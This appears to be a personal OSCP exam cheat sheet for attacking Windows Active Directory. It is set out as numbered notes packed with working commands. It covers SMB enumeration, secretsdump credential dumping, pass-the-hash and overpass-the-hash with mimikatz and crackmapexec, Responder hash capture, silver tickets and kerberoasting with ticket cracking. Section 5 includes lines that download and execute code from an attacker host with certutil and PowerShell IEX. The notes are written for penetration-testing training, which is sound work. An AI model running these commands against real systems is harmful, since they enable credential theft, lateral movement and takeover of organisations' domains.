
0)  first check on oscp:
	a) SMB - null sessione - crackmap, num4linux-ng , smbmap -u "guest" -p "" -P445 -H <IP>
	b) get IPSshare and dump users - use all creds in all targets, , use impacket etc , 
	c) LDAP - ldapsearch on domain controler ,
	d) rpc - use rpcclient 
	e) enum all boxes with all creds
	f) upload mimikatz.exe 
	g) https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg

------------------------------------------------------------------------------------------------

1)Pass the hash  (practical use in point 7)
	If you have any password and user use impacket tools
	you have local domain and password. You can dump sam file:
		#$ impacket-secretsdump HACKERDomanin.loacal/hguy:Password@192.168.35.144
		
	
	you will get some hashes and users (I found hash and user 'happy guy'):
		#$ crackmapexec smb 192.168.35.0/24 -U 'happy guy' -H aadsdfdsf....sdf --loacl-auth

  Password to winrm / smb
	        #$ crackmapexec smb192.168.35.0/24 -u Tiffany -p myPassword1234
		#$ crackmapexec smb192.168.35.0/24 -u Tiffany -p myPassword1234 --share
		#$ crackmapexec winrm 192.168.35.0/24 -u Tiffany -p myPassword1234

2) smb enum :
	#$ smbclient -N -L //10.10.10.123/  	
	or 
	#$ smbclient -N -L 10.10.10.123
 	or 
	#$ smbclient -N -L ////10.10.10.123//


	#$ smbmap -H 10.10.10.123

	#$ smbclient -N //10.10.10.123/general

	
3) NTLM hash:
	cach hash:
	#$ sudo responder -I eth0 -rdwv 


	use hashcat to crack entire recived data:

4) AD port numbers:

	#$ nslookup http://10.10.10.29:53

	zone transfer:
	#$ dnsrecon -d 10.10.10.103 -t axfr

	smb/netbios 139/445
	#$ smbclient -N -L //10.10.10.103

	#$ smbmap -H 10.10.10.103 -u anonymous -R



5) share files / download:
	c:\> certutil -split -f -urlcache http://10.10.14.15/test.txt

	evil-winrm upload:
	evil-winrm after connecting you can use upload:
	#$ evil-winrm -u user -p Password1 -i 10.10.10.161
	PS C:\> upload test.txt

	Powershell:
	C:\>powershell -c 'IEX(New-Object Net.WebClient).DownloadString("http://host/file.txt")'

	impacket:
	#$ impacket-smbserver -username UseName -password Password shar . -smb2support
	
	C:\> net use \\10.10.14.15\share /u:UseName Password 
	C:\> cd \\10.10.14.15\share



6) Windows privilige escalation resources:

	https://sushant747.gitbooks.io/total-oscp-guide/content/
		- search passwords in xml and ini file  (but change 'password' to 'pass' or 'key'0     
		- serch other files .config
		- search in registry 

	https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters

		
Priv Escalation what has to be done:
	c:\> systeminfo
	c:\> whoami /priv

	c:\> ipconfig
	c:\> ipconfig /all
		
	c:\> route print     <- connect to internal  network 
	
	c:\> arp -a 

	c:\> netastat -ano

winpeas many versions:
	https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS


Kerberosting etc:


└─$ impacket-GetADUsers -all active.htb/SVC_TGS -dc-ip 10.10.10.100 


└─$ impacket-GetUserSPNs   'active.htb/SVC_TGS:GPPstillStandingStrong2k18'  -request -dc-ip 10.10.10.100 




7)   Pass the hash - if you have NTLM hash ( only if server or servic use NTLM authentications)   , authenticate using NTLM hash

	kali: 
		kali@kali:~$ pth-winexe -U User%aabbb3b4...ee:2892d //10.10.0.22 cmd
		
			or use mimikatz.exe on windows:

		mimikatz# privilege::debug
		mimikatz# token::elevate

		mimikatz# sekurlsa::msv    <- get hash
		#mimikatz# lsadump::sam     <- not in pass the hash use 

		use mimikatz to get shell with ntlm hash     <- when "whoami" it can give diff user then you are
		mimikatz# sekurlsa::pth /user:Tony.Wonder /domain:jeflab.local /ntlm:13b29...5c                    <- will open cmd prompt
			then in new window you can log on other machines:
		c:\PsExec>PsExec.exe \\jefflab-dc01 cmd

	
		
8)   Overpass the hash -    use NTLM hash to get full kerberos TGT to to get full access. Use NTLM to get to Kerberos tickets	. (But only can use TGT for machine it was created for)
	example:  if you compromised machine where jadmin is/was authenticated (machin is hashing his credentials)
	
	windows:
		mimikatz# sekurlas::logonpasswords                           <-- dump hashes 
		
		mimikatz # sekurlsa::pth /user:jadmin /domain:corp.com /ntlm:e2b475.....327 /run:PowerShell.exe                <- get new powershell session to execute commands as jadmin
				you will get :
					PS C:\Windows\system32> net use \\dc01     <-- log to network share sing TGT
					
					PS C:\Windows\system32> klist         <-- list TGT , TGS etc (if used: "net use \\dc01"  fires thn you get creds from network if not it will be local)			
		
	
					PS C:\Windows\system32> PsExec.exe \\dc01 cmd.exe          <-- use jadmin to log into domain controller
					
			
			
9) Pass the Ticket   - use TGS to log to acces other machines (offers flexibility not additionall access )	  (connected to silver ticket , get sid users)				 
					
		
	windows:
		C:\Users\offsec.CORT> whoami /user
		
		USER INFORATION SID 
		=============== ===============================
		corp\offsec     S-1-5-21-1895...5541-2947..9466-4388...9864-1104    <-- 1104 is not part of SID
	
	get SID from above command and crack he silver ticket: 	

		
		mimikatz# kerberos::purge               <--  check existing kerberos tickes
		
		mimikatz# kerberos::list               <--  veryfy the purge
		
		
		mimikatz# kerberos::golden /user:offsec.com /sid:S-1-5-21-1895..5541-2947..9466-43...9864 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B47...27/ /ptt
						
		mimikatz# kerberos::list               <--  veryfy




10) Distributed component object model:



11)kerberosting -  get TGS from SPN using Linux and windows (Elevated Cybrary)
	
	 Linux - using Impacket : 
	 	
	 	a)  you have creds :

		kali@kali:~$ impacket-GetUserSPNs vulnnet-rst.local/t-skid:'tj072889' 10.10.10.23 -request		<---get back a ticket
	
		b) crack with hashcat or john 
		
	
		c) log to windows machine from linux 
		kali@kali:~$ crackmapexec smb 10.10.10.23 -u 'enterpise-service' -p 'somePassword'
	

		 
	 Windows (using kerberost - github.com/nidem/kerberoast , GetUserSPNs.ps1 ):
		a) Get Users with SPNS 
		   C:\> GetUserSPNs.ps1
		 
		b) GetService Tickets:
		   PS C:\> Add-Type -AssemblyName System.IdentityModel
		   
		   PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"  
		   or 	
		   PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"  
		   (what you get from GetUserSPNs.ps1 - "HTTP/web01.medin.local"  or "MSSQLSvc/xor-app23.xor.com:1433" )		
	
		c) extract Ticket
		   mimikatz # kerberos::list /export
	
		d) Crack Tickets: 
		   PS C:\> tgsrepcrack.py wordlist.txt <ticket.kirbi>
			or on Kali:
	           kirb2john  <ticket.kirbi>  and use hashcat

